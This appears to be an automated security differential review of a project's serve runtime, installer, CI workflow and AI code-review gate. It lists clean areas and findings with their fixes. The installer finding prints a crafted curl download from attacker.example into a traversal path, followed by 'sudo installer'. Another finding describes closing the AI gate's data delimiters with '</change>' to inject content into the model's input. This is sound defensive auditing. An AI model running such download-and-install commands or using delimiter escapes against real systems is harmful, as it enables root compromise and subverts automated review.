tool: differential-review (Trail of Bits skill, run by a subagent)
range: 81a4176..origin/dev plus the sgit serve package (b32a6ba, an ancestor)
summary: serve runtimes, static server, mirror, container copy and the CI workflow clean on the trust-boundary questions; defects in trust decisions on host and model answers (installer, AI gate)
clean: every subprocess call is an argv list with fixed verbs; no shell
loopback rule fails safe for localhost.attacker.example, 127.0.0.1.nip.io, 0.0.0.0, [::ffff:127.0.0.1], 127.1, user@localhost
static server: loopback bind, symlinks and .sg_vault refused, traversal refused, Host check, writes 405
mirror pull refuses rewinds, undecryptable and unknown heads; baselines byte-identical; objects verified before write; signature policy applied
only .sg_vault/bare/* is uploaded to the container; .sg_vault/local never read, uploaded or mounted; container runs as the host uid; no env secrets

CI: pull_request not pull_request_target; no ${{ }} inside run:; env-only inputs; set -f with unquoted $EXTRA_PACKAGES is correct; persist-credentials false on all 11 read-only checkouts; actions SHA-pinned; zizmor medium 0; actionlint clean
ai_review: exit 3 fails the job; exceptions exit 2; inconclusive verify keeps findings; model output never executed

findings.title: the installer executed an unvalidated release-API answer as root (asset name used as a path, URL passed to curl unchecked, then sudo installer)
findings.evidence: monkeypatched urlopen with crafted JSON: the plan printed curl -fL -o /tmp/../../Users/victim/Library/LaunchAgents/evil.pkg http://attacker.example/evil.pkg then sudo installer -pkg ... -target /
findings.resolved: checked_asset(): plain file name with the expected suffix, served from https://github.com/<owner>/<repo>/releases/download/ of the repository the API URL names; still no checksum (open)

findings.title: any register value other than exactly "new" (empty, none, n/a, a non-existent TM id) exempted a finding from the gate
findings.evidence: critical/0.99 finding with register "", " ", "none", "n/a", "TM-R999": not gated
findings.resolved: is_new(): exempt only for ^TM-[FR]\d+$ that occurs in the threat model text; unit tests

findings.title: data delimiters not escaped: a diff containing </change> closes the block; design inputs (intent, threat model, dossiers, slice, waivers) are read from the PR head
findings.evidence: git stubbed to return a diff with </change> and a fake <file> tag: user_text() contained two closers
findings.resolved: per-run nonce in the tag names; reading the design from the base commit and guarding those paths is still open (DR2-004)

findings.title: every gate is self-attesting: a PR can grow the Bandit baseline, add a zizmor ignore or a waiver, shrink the slice, or add nosec/nosemgrep in the same change
findings.proposed: CODEOWNERS on those paths; a step that warns or fails when the PR touches them or adds markers

findings.title: waiver fingerprint file|function|category is coarse; an empty function made a waiver file-wide for its category
findings.evidence: two unrelated findings in one function/category share an id; empty function gives a file-wide id
findings.resolved: empty function falls back to the normalised title; the coarse key is kept on purpose (waivers survive rewording); no expiry yet

findings.title: serve push re-sends the branch index as a plain write every push: a branch or tag created in the browser is lost on the next serve push
findings.evidence: after writing a changed index on the in-memory host, mirror.push() replaced it unconditionally
findings.proposed: write-if-match the index against the server copy, or merge it as sgit push does

findings.title: unpinned image (:latest), package (uv run --with sgraph-ai-app-send) and installer scripts (get.docker.com, astral.sh) with no checksums; the banner hands the read key to the local UI, so a hostile image gets plaintext
findings.resolved: TM-R38 row corrected; pinning is open

findings.title: predictable shared-tmp paths for downloads that are then run as root
findings.evidence: not reproduced (protected_regular on modern Linux; per-user TMPDIR on macOS)

findings.title: only the literal 0.0.0.0 triggered the exposure warning
two rows were numbered TM-R38 (the walk-up ceiling and the serve image)
findings.resolved: the walk-up row is TM-R41; test, ranking and records updated

findings.title: --image, --bind and --data reach the runtime argv untyped (typed only when the state is saved); a value starting with - is a single argv element docker rejects
findings.proposed: type at Vault__Serve.start(); make Safe_Str__Bind_Address strict; refuse ":" in data_dir for docker-like runtimes

findings.title: files the container can write (.sgit-sent.json; with --data, the state file) are read back as control
findings.proposed: keep state and the sent-record outside the mounted folder

findings.title: model output written unescaped into GITHUB_STEP_SUMMARY
findings.resolved: titles, files and register rendered as code spans
